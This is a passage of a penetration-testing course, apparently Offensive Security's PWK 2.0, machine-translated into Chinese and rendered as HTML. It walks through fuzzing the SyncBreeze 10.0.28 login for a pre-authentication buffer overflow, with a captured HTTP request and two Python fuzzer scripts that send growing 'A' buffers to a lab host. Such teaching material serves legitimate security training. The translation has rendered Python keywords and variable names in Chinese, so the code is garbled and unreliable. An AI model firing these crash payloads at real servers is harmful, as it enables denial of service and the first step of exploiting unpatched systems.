<div style="position:absolute;top:59135;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.1.1</font></font></i></nobr></div>
<div style="position:absolute;top:59135;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对 HTTP 协议进行模糊测试</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:59172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们看一下我们的易受攻击的应用程序来演示模糊测试和漏洞利用开发</font></font></nobr></div>
<div style="position:absolute;top:59192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过程。</font><font style="vertical-align: inherit;">2017年，在登录机制中发现了缓冲区溢出漏洞</font></font></nobr></div>
<div style="position:absolute;top:59211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SyncBreeze 版本 10.0.28。</font><font style="vertical-align: inherit;">具体来说，HTTP POST 登录请求的用户名字段可以</font></font></nobr></div>
<div style="position:absolute;top:59230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于使应用程序崩溃。</font><font style="vertical-align: inherit;">由于不需要工作凭据来触发</font></font></nobr></div>
<div style="position:absolute;top:59250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞，它被认为是预认证缓冲区溢出，这对我们来说是一个极好的机会</font></font></nobr></div>
<div style="position:absolute;top:59269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试人员。</font></font></nobr></div>
<div style="position:absolute;top:59302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将首先在我们的 Windows 10 客户端计算机上启动 SyncBreeze 服务。</font><font style="vertical-align: inherit;">这可以做到</font></font></nobr></div>
<div style="position:absolute;top:59321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过启动服务控制台</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">services.msc</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，右键单击 SyncBreeze 并选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Start</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:59427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">310 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Flexense，2019 年），http://www.syncbreeze.com/</font></font></font></nobr></div>
<div style="position:absolute;top:59447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">311 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Fuzzing</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:59575;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="51"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 51 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:59608;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:60685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:60685;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:60685;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">371</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:60021;left:354"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 206：SyncBreeze 服务启动</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在服务正在运行，我们可以专注于漏洞发现过程。</font><font style="vertical-align: inherit;">如果我们没有</font></font></nobr></div>
<div style="position:absolute;top:60072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">预先知道这个漏洞，我们将开始模糊应用程序的每个输入字段</font></font></nobr></div>
<div style="position:absolute;top:60091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供，希望出现意外行为或应用程序崩溃。</font><font style="vertical-align: inherit;">就本模块而言</font></font></nobr></div>
<div style="position:absolute;top:60111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，我们将跳过此步骤并专门关注易受攻击的用户名字段。</font><font style="vertical-align: inherit;">为了</font></font></nobr></div>
<div style="position:absolute;top:60130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从头开始编写基于生成的基本模糊器，我们将首先对网络流量进行采样</font></font></nobr></div>
<div style="position:absolute;top:60149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在易受攻击的交换期间在客户端和服务器之间传递以用作我们的输入</font></font></nobr></div>
<div style="position:absolute;top:60169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据或种子。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:60230;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将在本模块中使用 Wireshark 来收集网络协议信息，</font></font></i></nobr></div>
<div style="position:absolute;top:60250;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是像 Burp Suite 这样的网络代理也可以用来分析基于 HTTP 的</font></font></i></nobr></div>
<div style="position:absolute;top:60269;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">协议也是如此。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:60331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将在 Kali Linux 机器上启动 Wireshark，使用无效登录到 SyncBreeze</font></font></nobr></div>
<div style="position:absolute;top:60351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭据，并在我们登录时监视 Windows 10 计算机的 TCP 端口 80 上的流量</font></font></nobr></div>
<div style="position:absolute;top:60370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同步微风：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:60626;left:355"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 207：登录 SyncBreeze </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:60763;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="52"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 52 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:60796;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:61873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:61873;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:61873;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">372</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:60886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.1.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:61058;left:329"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 208：Wireshark 捕获 HTTP 流量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:61089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查流量会发现 TCP 三向握手，然后是我们的 HTTP 流量。</font><font style="vertical-align: inherit;">TCP</font></font></nobr></div>
<div style="position:absolute;top:61109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流如下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:61143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">POST /登录 HTTP/1.1</font></font></nobr></div>
<div style="position:absolute;top:61160;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机：10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:61177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户代理：Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0</font></font></nobr></div>
<div style="position:absolute;top:61194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接受：text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</font></font></nobr></div>
<div style="position:absolute;top:61211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接受语言：en-US,en;q=0.5</font></font></nobr></div>
<div style="position:absolute;top:61228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接受编码：gzip、deflate</font></font></nobr></div>
<div style="position:absolute;top:61245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">推荐人：http://10.11.0.22/login</font></font></nobr></div>
<div style="position:absolute;top:61262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接：保持连接</font></font></nobr></div>
<div style="position:absolute;top:61279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">升级不安全请求：1</font></font></nobr></div>
<div style="position:absolute;top:61296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容类型：应用程序/x-www-form-urlencoded</font></font></nobr></div>
<div style="position:absolute;top:61313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容长度：27</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:61347;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名=AAAA&amp;密码=BBBB </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP/1.1 200 OK</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:61364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容类型：文本/html</font></font></nobr></div>
<div style="position:absolute;top:61381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容长度：730</font></font></nobr></div>
<div style="position:absolute;top:61415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/h</font></font></nobr></div>
<div style="position:absolute;top:61432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;html&gt;</font></font></nobr></div>
<div style="position:absolute;top:61449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;头&gt;</font></font></nobr></div>
<div style="position:absolute;top:61466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;meta http-equiv='Content-Type' content='text/html; </font><font style="vertical-align: inherit;">字符集=UTF-8'&gt;</font></font></nobr></div>
<div style="position:absolute;top:61483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;meta name='作者' content='Flexense HTTP Server v10.0.28'&gt;</font></font></nobr></div>
<div style="position:absolute;top:61500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;meta name='GENERATOR' content='Flexense HTTP v10.0.28'&gt;</font></font></nobr></div>
<div style="position:absolute;top:61516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;title&gt;Sync Breeze Enterprise @ DESKTOP-4MK82OB - 错误&lt;/title&gt;</font></font></nobr></div>
<div style="position:absolute;top:61534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;link rel='stylesheet' type='text/css' href='resources/syncbreeze.css' media='all'&gt;</font></font></nobr></div>
<div style="position:absolute;top:61551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/头&gt;</font></font></nobr></div>
<div style="position:absolute;top:61568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;身体&gt;</font></font></nobr></div>
<div style="position:absolute;top:61585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;中心&gt;</font></font></nobr></div>
<div style="position:absolute;top:61601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;div class='error_message' style='margin-top: 200px;'&gt;</font></font></nobr></div>
<div style="position:absolute;top:61618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;p&gt;指定的用户名和/或密码不正确。&lt;/p&gt;</font></font></nobr></div>
<div style="position:absolute;top:61635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/div&gt;</font></font></nobr></div>
<div style="position:absolute;top:61652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;input style='margin-top: 20px;' </font><font style="vertical-align: inherit;">type='button' value='Close' onClick="history.go(-1);"</font></font></nobr></div>
<div style="position:absolute;top:61669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/中心&gt;</font></font></nobr></div>
<div style="position:absolute;top:61686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/正文&gt;</font></font></nobr></div>
<div style="position:absolute;top:61703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/html&gt;</font></font></nobr></div>
<div style="position:absolute;top:61722;left:387"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 341 - HTTP 流量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:61752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 回复显示用户名和密码无效，但这无关紧要，因为</font></font></nobr></div>
<div style="position:absolute;top:61771;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正在调查的漏洞在身份验证发生之前就存在。</font><font style="vertical-align: inherit;">我们可以复制这个</font></font></nobr></div>
<div style="position:absolute;top:61791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 通信并开始使用 Python</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">概念证明</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(PoC) 脚本</font><font style="vertical-align: inherit;">构建我们的模糊器</font></font></nobr></div>
<div style="position:absolute;top:61810;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类似于以下内容： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:61951;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="53"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 53 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:61984;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:63061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:63061;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:63061;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">373</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:62082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/usr/bin/python</font></font></nobr></div>
<div style="position:absolute;top:62099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进口插座</font></font></nobr></div>
<div style="position:absolute;top:62133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试：</font></font></nobr></div>
<div style="position:absolute;top:62150;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "\n发送邪恶的缓冲区..."</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:62184;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大小 = 100</font></font></b></nobr></div>
<div style="position:absolute;top:62217;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inputBuffer = "A" * 大小</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:62252;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">content = "username=" + </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inputBuffer</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> + "&amp;password=A"</font></font></nobr></div>
<div style="position:absolute;top:62285;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer = "POST /login HTTP/1.1\r\n"</font></font></nobr></div>
<div style="position:absolute;top:62302;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "主机：10.11.0.22\r\n"</font></font></nobr></div>
<div style="position:absolute;top:62319;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "用户代理：Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Fire</font></font></nobr></div>
<div style="position:absolute;top:62336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">狐狸/52.0\r\n"</font></font></nobr></div>
<div style="position:absolute;top:62353;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "接受：text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</font></font></nobr></div>
<div style="position:absolute;top:62370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\r\n"</font></font></nobr></div>
<div style="position:absolute;top:62387;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "Accept-Language: en-US,en;q=0.5\r\n"</font></font></nobr></div>
<div style="position:absolute;top:62404;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "引用者：http://10.11.0.22/login\r\n"</font></font></nobr></div>
<div style="position:absolute;top:62421;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "连接：关闭\r\n"</font></font></nobr></div>
<div style="position:absolute;top:62438;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "Content-Type: application/x-www-form-urlencoded\r\n"</font></font></nobr></div>
<div style="position:absolute;top:62455;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "内容长度："+str(len(content))+"\r\n"</font></font></nobr></div>
<div style="position:absolute;top:62472;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "\r\n"</font></font></nobr></div>
<div style="position:absolute;top:62506;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += 内容</font></font></nobr></div>
<div style="position:absolute;top:62540;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</font></font></nobr></div>
<div style="position:absolute;top:62574;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.connect(("10.11.0.22", 80))</font></font></nobr></div>
<div style="position:absolute;top:62591;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.send（缓冲区）</font></font></nobr></div>
<div style="position:absolute;top:62625;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.close()</font></font></nobr></div>
<div style="position:absolute;top:62659;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“\n完成！”</font></font></nobr></div>
<div style="position:absolute;top:62693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了：</font></font></nobr></div>
<div style="position:absolute;top:62710;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“无法连接！”</font></font></nobr></div>
<div style="position:absolute;top:62729;left:240"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 342 - 用于执行登录 HTTP POST 的概念验证 Python 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:62758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">既然我们知道我们正在处理缓冲区溢出漏洞，我们将构建我们的代-</font></font></nobr></div>
<div style="position:absolute;top:62778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于模糊器，以便它将发送多个具有越来越长用户名的 HTTP POST 请求。</font></font></nobr></div>
<div style="position:absolute;top:62811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们脚本的下一次迭代如清单 343 所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:62845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/usr/bin/python</font></font></nobr></div>
<div style="position:absolute;top:62863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进口插座</font></font></nobr></div>
<div style="position:absolute;top:62879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导入时间</font></font></nobr></div>
<div style="position:absolute;top:62896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导入系统</font></font></nobr></div>
<div style="position:absolute;top:62930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大小 = 100</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:62964;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而（大小 &lt; 2000）：</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:62981;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试：</font></font></nobr></div>
<div style="position:absolute;top:62998;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "\n用 %s 字节发送恶意缓冲区" % 大小 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:63139;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="54"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 54 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:63172;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:64249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:64249;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:64249;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">374</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:63284;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inputBuffer = "A" * 大小</font></font></nobr></div>
<div style="position:absolute;top:63318;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">content = "username=" + inputBuffer + "&amp;password=A"</font></font></nobr></div>
<div style="position:absolute;top:63352;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer = "POST /login HTTP/1.1\r\n"</font></font></nobr></div>
<div style="position:absolute;top:63369;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "主机：10.11.0.22\r\n"</font></font></nobr></div>
<div style="position:absolute;top:63386;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "用户代理：Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Fire</font></font></nobr></div>
<div style="position:absolute;top:63403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">狐狸/52.0\r\n"</font></font></nobr></div>
<div style="position:absolute;top:63420;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "接受：text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</font></font></nobr></div>
<div style="position:absolute;top:63437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\r\n"</font></font></nobr></div>
<div style="position:absolute;top:63454;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "Accept-Language: en-US,en;q=0.5\r\n"</font></font></nobr></div>
<div style="position:absolute;top:63471;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "引用者：http://10.11.0.22/login\r\n"</font></font></nobr></div>
<div style="position:absolute;top:63488;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "连接：关闭\r\n"</font></font></nobr></div>
<div style="position:absolute;top:63505;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer += "Content-Type: application/x-www-form-urlencoded\r\n"</font></font></nobr></div>
<div style="position:absolute;top:63522;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "内容长度："+str(len(content))+"\r\n"</font></font></nobr></div>
<div style="position:absolute;top:63539;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += "\r\n"</font></font></nobr></div>
<div style="position:absolute;top:63573;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 += 内容</font></font></nobr></div>
<div style="position:absolute;top:63607;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)</font></font></nobr></div>
<div style="position:absolute;top:63641;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.connect(("10.11.0.22", 80))</font></font></nobr></div>
<div style="position:absolute;top:63658;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.send（缓冲区）</font></font></nobr></div>
<div style="position:absolute;top:63692;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.close()</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:63726;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尺寸 += 100</font></font></b></nobr></div>
<div style="position:absolute;top:63743;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">时间.睡眠(10)</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:63777;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了：</font></font></nobr></div>
<div style="position:absolute;top:63793;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "\n无法连接！"</font></font></nobr></div>
<div style="position:absolute;top:63810;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统退出（）</font></font></nobr></div>
<div style="position:absolute;top:63830;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 343 - 模糊 SyncBreeze 的 Python 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
